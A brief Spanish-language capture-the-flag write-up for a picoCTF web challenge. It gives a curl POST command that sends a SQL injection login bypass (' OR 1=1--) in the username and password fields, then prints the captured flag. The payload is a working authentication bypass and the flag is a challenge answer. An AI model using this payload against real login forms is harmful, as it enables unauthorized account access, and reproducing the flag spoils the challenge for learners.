## Descripción 
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:52574/).
## Solución
Hay que hacer bypass en la consola de linux usando 
curl -X POST http://saturn.picoctf.net:56983/ \
  -d "username=' OR 1=1--&password=' OR 1=1--"
  para obtener la flag:
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
## Notas Adicionales 
## Referencias